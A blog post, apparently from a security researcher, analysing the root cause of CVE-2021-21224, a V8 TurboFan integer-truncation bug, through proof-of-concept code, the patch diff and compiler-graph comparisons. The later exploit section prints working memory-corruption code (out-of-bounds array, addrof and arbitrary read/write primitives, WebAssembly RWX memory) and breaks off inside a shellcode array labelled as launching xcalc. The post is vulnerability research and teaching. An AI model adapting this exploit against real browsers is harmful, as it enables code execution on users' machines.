<!doctype html><html lang=en>
<head><title>
Root Cause Analysis of CVE-2021-21224 &ndash; Anvbis
</title>
<meta name=description content>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
<link rel=stylesheet href=https://anvbis.github.io/css/syntax/theme.css>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis@anvbis</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
</ul>
</nav>
<ul class=aside__social-links>
<li>
<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=mailto:contact@anvbis.au rel=me aria-label=Email title=Email><i class="fa fa-envelope" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</header>
<section class=page__body>
<header class=content__header>
<h1>Root Cause Analysis of CVE-2021-21224</h1>
</header>
<div class=content__body>
<h2 id=overview>Overview</h2>
<p>An incorrect optimization in TurboFan&rsquo;s representation changer results in Int64 values being erroneously truncated to Int32 values.</p>
<p>I figured this bug would be a great way to further explore TurboFan&rsquo;s simplified lowering phase, and learn more about representation change internals.</p>
<p>You can find the relevant chromium bug report <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">here</a>.</p>
<h2 id=proof-of-concept>Proof of Concept</h2>
<p>Below is the proof-of-concept that was provided in the original issue. I&rsquo;ve reformatted it a little in order to make it a bit more readable, but the code is the same.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=cm>/* supplied_poc.js */</span>

<span class=kd>function</span> <span class=nx>foo</span><span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>y</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nb>Date</span><span class=p>(</span><span class=mi>42</span><span class=p>)).</span><span class=nx>getMilliseconds</span><span class=p>();</span>

  <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=nx>i</span> <span class=o>=</span> <span class=mh>0xffffffff</span><span class=p>;</span>

  <span class=k>return</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>max</span><span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=nx>y</span><span class=p>,</span> <span class=nx>i</span><span class=p>,</span> <span class=mi>1</span> <span class=o>+</span> <span class=nx>y</span><span class=p>)</span> <span class=o>&gt;</span> <span class=nx>y</span><span class=p>;</span>
<span class=p>}</span>

<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>foo</span><span class=p>(</span><span class=kc>true</span><span class=p>));</span> <span class=cm>/* true */</span>

<span class=o>%</span><span class=nx>PrepareFunctionForOptimization</span><span class=p>(</span><span class=nx>foo</span><span class=p>);</span>
<span class=nx>foo</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span>

<span class=o>%</span><span class=nx>OptimizeFunctionOnNextCall</span><span class=p>(</span><span class=nx>foo</span><span class=p>);</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>foo</span><span class=p>(</span><span class=kc>true</span><span class=p>));</span> <span class=cm>/* false */</span>
</code></pre></div><p>In the process of investigating this bug, I also managed to produce this much simpler proof-of-concept. This is what I&rsquo;ll be using for further analysis - at the very least, a simpler PoC means a simpler Turbolizer graph.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=cm>/* simplified_poc.js */</span>

<span class=kd>function</span> <span class=nx>foo</span><span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mh>0xffffffff</span><span class=p>;</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=nx>i</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>

  <span class=kd>let</span> <span class=nx>z</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>max</span><span class=p>(</span><span class=mi>1337</span><span class=p>,</span> <span class=nx>i</span><span class=p>);</span>
  <span class=k>return</span> <span class=mi>0</span> <span class=o>-</span> <span class=nx>z</span><span class=p>;</span>
<span class=p>}</span>

<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>foo</span><span class=p>(</span><span class=kc>false</span><span class=p>));</span> <span class=cm>/* -4294967295 */</span>

<span class=o>%</span><span class=nx>PrepareFunctionForOptimization</span><span class=p>(</span><span class=nx>foo</span><span class=p>);</span>
<span class=nx>foo</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span>

<span class=o>%</span><span class=nx>OptimizeFunctionOnNextCall</span><span class=p>(</span><span class=nx>foo</span><span class=p>);</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>foo</span><span class=p>(</span><span class=kc>false</span><span class=p>));</span> <span class=cm>/* 1 */</span>
</code></pre></div><p>What I find particularly interesting about this simplified proof-of-concept is that it doesn&rsquo;t use the left shift operator - while the original bug report states the following:</p>
<blockquote>
<p>The following PoC generates a V8 incorrect optimization of [the] left shift operator, which leads to [the] optimized function return value to be different than [the] unoptimized function return value.</p>
</blockquote>
<p>My initial assumption is that bug is actually due to an incorrect optimization in the comparison operator (as TurboFan effectively optimizes the <code>Math.max()</code> call to an <code>Int64LessThan</code> node) rather than an incorrect optimization in the left shift operator.</p>
<p>While I might be completely wrong, it&rsquo;s definitely a topic that requires further investigation.</p>
<h2 id=patch-implementation-details>Patch Implementation Details</h2>
<p>Starting by just looking at the comment provided with the patch, the vulnerability appears to be a logic bug in <code>GetWord32RepresentationFor</code>. There&rsquo;s also mention of respecting the TypeCheckKind, though I&rsquo;m not sure what this means just yet.</p>
<pre><code>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor
We have to respect the TypeCheckKind.
</code></pre><p>Looking at a diff of the patch itself, we can see that the bug occurs when converting a 64-bit integer to a 32-bit integer in the SimplifiedLowering phase.</p>
<p>The author seems to have added only a single new check, ensuring that the TypeCheckKind is kNone when the output type is Unsigned32.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=gh>diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
</span><span class=gh>index 64b274c..3d937ad 100644
</span><span class=gh></span><span class=gd>--- a/src/compiler/representation-change.cc
</span><span class=gd></span><span class=gi>+++ b/src/compiler/representation-change.cc
</span><span class=gi></span><span class=gu>@@ -949,10 +949,10 @@
</span><span class=gu></span>     return node;
   } else if (output_rep == MachineRepresentation::kWord64) {
     if (output_type.Is(Type::Signed32()) ||
<span class=gd>-        output_type.Is(Type::Unsigned32())) {
</span><span class=gd>-      op = machine()-&gt;TruncateInt64ToInt32();
</span><span class=gd>-    } else if (output_type.Is(cache_-&gt;kSafeInteger) &amp;&amp;
</span><span class=gd>-               use_info.truncation().IsUsedAsWord32()) {
</span><span class=gd></span><span class=gi>+        (output_type.Is(Type::Unsigned32()) &amp;&amp;
</span><span class=gi>+         use_info.type_check() == TypeCheckKind::kNone) ||
</span><span class=gi>+        (output_type.Is(cache_-&gt;kSafeInteger) &amp;&amp;
</span><span class=gi>+         use_info.truncation().IsUsedAsWord32())) {
</span><span class=gi></span>       op = machine()-&gt;TruncateInt64ToInt32();
     } else if (use_info.type_check() == TypeCheckKind::kSignedSmall ||
                use_info.type_check() == TypeCheckKind::kSigned32 ||
</code></pre></div><p>So what happens if the TypeCheckKind is kSigned32, rather than kNone? I suspect that prior to the patch, TurboFan would erroneously truncate the Unsigned32 value to a Signed32 integer. I&rsquo;ll need to make some modifications to the patch in order to test this.</p>
<p>In the code snippet below I&rsquo;ve just edited out irrelevant code to see the control flow after the patch.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=n>Node</span><span class=o>*</span> <span class=n>RepresentationChanger</span><span class=o>::</span><span class=n>GetWord32RepresentationFor</span><span class=p>(</span>
  <span class=k>const</span> <span class=n>Operator</span><span class=o>*</span> <span class=n>op</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>  

  <span class=cm>/* ... */</span>

  <span class=p>}</span> <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=n>output_rep</span> <span class=o>==</span> <span class=n>MachineRepresentation</span><span class=o>::</span><span class=n>kWord64</span><span class=p>)</span> <span class=p>{</span>
    <span class=cm>/* ... */</span>
    <span class=p>}</span> <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=cm>/* ... */</span>
        <span class=n>output_type</span><span class=p>.</span><span class=n>Is</span><span class=p>(</span><span class=n>Type</span><span class=o>::</span><span class=n>Unsigned32</span><span class=p>())</span> <span class=o>&amp;&amp;</span>
        <span class=n>use_info</span><span class=p>.</span><span class=n>type_check</span><span class=p>()</span> <span class=o>==</span> <span class=n>TypeCheckKind</span><span class=o>::</span><span class=n>kNone</span> <span class=cm>/* ... */</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>op</span> <span class=o>=</span> <span class=n>machine</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>TruncateInt64ToInt32</span><span class=p>();</span>
    <span class=p>}</span> 
    <span class=cm>/* ... */</span>
  <span class=p>}</span>

  <span class=cm>/* ... */</span>

  <span class=k>return</span> <span class=nf>InsertConversion</span><span class=p>(</span><span class=n>node</span><span class=p>,</span> <span class=n>op</span><span class=p>,</span> <span class=n>use_node</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>Now that I have a bit more insight into the patch itself, there are still some questions that will hopefully be answered when looking at Turbolizer graphs:</p>
<ol>
<li>Why does the value need to be converted into a Word32 representation in the first place?</li>
<li>How can we leverage this signed/unsigned integer confusion to gain code execution?</li>
</ol>
<h1 id=turbolizer-graph-comparison>Turbolizer Graph Comparison</h1>
<p>I&rsquo;ve generated a Turbolizer graph for the PoC both prior to the patch, and after the patch was applied.</p>
<p>In this first Turbolizer graph (pre-patch), we can see that TurboFan assumes our input value has a range of (-1, 4294967295). This Float64 value is then converted to an Int64 for comparison, as the <code>Math.max</code> call was lowered to an Int64LessThan node.</p>
<p>The result of this is then converted to a 32-bit signed integer via the TruncateInt64ToInt32 node.</p>
<figure><img src=/img/20221206/turbolizer-1.png alt=turbolizer-1.png><figcaption>
<p>Figure 1: Vulnerable turbolizer graph.</p>
</figcaption>
</figure>
<p>The post-patch Turbolizer graph starts off very similarly to the pre-patch graph. However, rather than converting the output of <code>Math.max</code> via a TruncateInt64ToInt32 node, we see a CheckedUint64ToInt32 node.</p>
<p>In this post-patch graph we can see that TurboFan has now correctly identified that the input was an unsigned value (that needed to be used in a signed operation), before converting it to a 32-bit integer.</p>
<figure><img src=/img/20221206/turbolizer-2.png alt=turbolizer-2.png><figcaption>
<p>Figure 2: Patched turbolizer graph.</p>
</figcaption>
</figure>
<p>In our case, as <code>use_info.type_check()</code> is kSigned32 rather than kNone, we fail the added check.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++>    <span class=p>}</span> <span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=cm>/* ... */</span>
        <span class=n>output_type</span><span class=p>.</span><span class=n>Is</span><span class=p>(</span><span class=n>Type</span><span class=o>::</span><span class=n>Unsigned32</span><span class=p>())</span> <span class=o>&amp;&amp;</span>
        <span class=n>use_info</span><span class=p>.</span><span class=n>type_check</span><span class=p>()</span> <span class=o>==</span> <span class=n>TypeCheckKind</span><span class=o>::</span><span class=n>kNone</span> <span class=cm>/* ... */</span><span class=p>)</span> <span class=p>{</span>
</code></pre></div><p>Instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a <code>CheckedUint64ToInt32</code> node, rather than a <code>TruncateInt64ToInt32</code> node.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++>      <span class=k>if</span> <span class=p>(</span><span class=n>output_type</span><span class=p>.</span><span class=n>Is</span><span class=p>(</span><span class=n>cache_</span><span class=o>-&gt;</span><span class=n>kPositiveSafeInteger</span><span class=p>))</span> <span class=p>{</span>
        <span class=n>op</span> <span class=o>=</span> <span class=n>simplified</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>CheckedUint64ToInt32</span><span class=p>(</span><span class=n>use_info</span><span class=p>.</span><span class=n>feedback</span><span class=p>());</span>
</code></pre></div><h1 id=exploitability>Exploitability</h1>
<p>As this is bug was discovered prior to <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1198696">this patch</a>, we can use the <code>Array.prototype.shift</code> trick to create an array with a length of <code>-1</code>.</p>
<p>This gives us out-of-bounds read/write access below the array&rsquo;s element store. In the code snippet below, I use this to corrupt another array&rsquo;s length value, giving very stable out-of-bounds access.</p>
<p>From this point it&rsquo;s a trivial exercise to build exploit primitives and gain code execution.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>function</span> <span class=nx>foo</span><span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>x</span> <span class=o>=</span> <span class=mh>0xffffffff</span><span class=p>;</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=nx>x</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>

  <span class=kd>let</span> <span class=nx>z</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>x</span><span class=p>);</span>
  <span class=nx>z</span> <span class=o>=</span> <span class=mi>0</span> <span class=o>-</span> <span class=nx>z</span><span class=p>;</span> 
  <span class=nx>z</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>sign</span><span class=p>(</span><span class=nx>z</span><span class=p>);</span>

  <span class=kd>let</span> <span class=nx>cor</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Array</span><span class=p>(</span><span class=nx>z</span><span class=p>);</span>
  <span class=nx>cor</span><span class=p>.</span><span class=nx>shift</span><span class=p>();</span>

  <span class=kd>let</span> <span class=nx>oob</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>,</span> <span class=mf>2.2</span><span class=p>,</span> <span class=mf>3.3</span><span class=p>];</span>
  <span class=k>return</span> <span class=p>{</span> <span class=nx>cor</span><span class=p>,</span> <span class=nx>oob</span> <span class=p>};</span>
<span class=p>}</span>

<span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>100000</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
  <span class=nx>foo</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span>

<span class=kd>let</span> <span class=p>{</span> <span class=nx>cor</span><span class=p>,</span> <span class=nx>oob</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>foo</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span>
<span class=nx>cor</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1337</span><span class=p>;</span>
</code></pre></div><p>I&rsquo;ve written and attached an entire exploit for this CVE below.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>bs</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>fs</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Float64Array</span><span class=p>(</span><span class=nx>bs</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>is</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>BigUint64Array</span><span class=p>(</span><span class=nx>bs</span><span class=p>);</span>

<span class=kr>const</span> <span class=nx>ftoi</span> <span class=o>=</span> <span class=nx>x</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=nx>fs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>x</span><span class=p>;</span>
  <span class=k>return</span> <span class=nx>is</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
<span class=p>}</span>

<span class=kr>const</span> <span class=nx>itof</span> <span class=o>=</span> <span class=nx>x</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=nx>is</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>x</span><span class=p>;</span>
  <span class=k>return</span> <span class=nx>fs</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
<span class=p>}</span>

<span class=kd>function</span> <span class=nx>foo</span><span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>x</span> <span class=o>=</span> <span class=mh>0xffffffff</span><span class=p>;</span>
  <span class=k>if</span> <span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=nx>x</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>

  <span class=kd>let</span> <span class=nx>z</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>x</span><span class=p>);</span>
  <span class=nx>z</span> <span class=o>=</span> <span class=mi>0</span> <span class=o>-</span> <span class=nx>z</span><span class=p>;</span> 
  <span class=nx>z</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>sign</span><span class=p>(</span><span class=nx>z</span><span class=p>);</span>

  <span class=kd>let</span> <span class=nx>cor</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Array</span><span class=p>(</span><span class=nx>z</span><span class=p>);</span>
  <span class=nx>cor</span><span class=p>.</span><span class=nx>shift</span><span class=p>();</span>

  <span class=kd>let</span> <span class=nx>oob</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>,</span> <span class=mf>2.2</span><span class=p>,</span> <span class=mf>3.3</span><span class=p>];</span>
  <span class=k>return</span> <span class=p>{</span> <span class=nx>cor</span><span class=p>,</span> <span class=nx>oob</span> <span class=p>};</span>
<span class=p>}</span>

<span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>100000</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
  <span class=nx>foo</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span>

<span class=kd>let</span> <span class=p>{</span> <span class=nx>cor</span><span class=p>,</span> <span class=nx>oob</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>foo</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span>
<span class=nx>cor</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1337</span><span class=p>;</span>

<span class=cm>/* flt.elements @ oob[10] (upper) */</span>
<span class=cm>/* obj.elements @ oob[22] (upper) */</span>
<span class=kd>let</span> <span class=nx>flt</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
<span class=kd>let</span> <span class=nx>tmp</span> <span class=o>=</span> <span class=p>{</span><span class=nx>a</span><span class=o>:</span> <span class=mi>1</span><span class=p>};</span>
<span class=kd>let</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>[</span><span class=nx>tmp</span><span class=p>];</span>

<span class=kd>function</span> <span class=nx>addrof</span><span class=p>(</span><span class=nx>o</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=nx>ftoi</span><span class=p>(</span><span class=nx>oob</span><span class=p>[</span><span class=mi>22</span><span class=p>])</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>;</span>
  <span class=kd>let</span> <span class=nx>b</span> <span class=o>=</span> <span class=nx>ftoi</span><span class=p>(</span><span class=nx>oob</span><span class=p>[</span><span class=mi>10</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>;</span>
  <span class=nx>oob</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=nx>itof</span><span class=p>((</span><span class=nx>a</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>+</span> <span class=nx>b</span><span class=p>);</span>
  <span class=nx>obj</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>o</span><span class=p>;</span>
  <span class=k>return</span> <span class=p>(</span><span class=nx>ftoi</span><span class=p>(</span><span class=nx>flt</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
<span class=p>}</span>

<span class=kd>function</span> <span class=nx>read</span><span class=p>(</span><span class=nx>p</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=nx>ftoi</span><span class=p>(</span><span class=nx>oob</span><span class=p>[</span><span class=mi>10</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>;</span>
  <span class=nx>oob</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=nx>itof</span><span class=p>(((</span><span class=nx>p</span> <span class=o>-</span> <span class=mi>8</span><span class=nx>n</span> <span class=o>+</span> <span class=mi>1</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>+</span> <span class=nx>a</span><span class=p>);</span>
  <span class=k>return</span> <span class=nx>ftoi</span><span class=p>(</span><span class=nx>flt</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
<span class=p>}</span>

<span class=kd>function</span> <span class=nx>write</span><span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=nx>ftoi</span><span class=p>(</span><span class=nx>oob</span><span class=p>[</span><span class=mi>10</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>;</span>
  <span class=nx>oob</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>=</span> <span class=nx>itof</span><span class=p>(((</span><span class=nx>p</span> <span class=o>-</span> <span class=mi>8</span><span class=nx>n</span> <span class=o>+</span> <span class=mi>1</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>+</span> <span class=nx>a</span><span class=p>);</span>
  <span class=nx>flt</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>itof</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
<span class=p>}</span>

<span class=kd>let</span> <span class=nx>wasm</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span>
  <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x91</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span>
  <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x8a</span><span class=p>,</span>
  <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span>
  <span class=mh>0x0b</span>
<span class=p>]);</span>

<span class=kd>let</span> <span class=nx>module</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=nx>wasm</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>module</span><span class=p>);</span>

<span class=kd>let</span> <span class=nx>rwx</span> <span class=o>=</span> <span class=nx>read</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>instance</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x68</span><span class=nx>n</span><span class=p>);</span>

<span class=cm>/* DISPLAY=&#39;:0.0&#39; xcalc */</span> 
<span class=kd>let</span> <span class=nx>shellcode</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
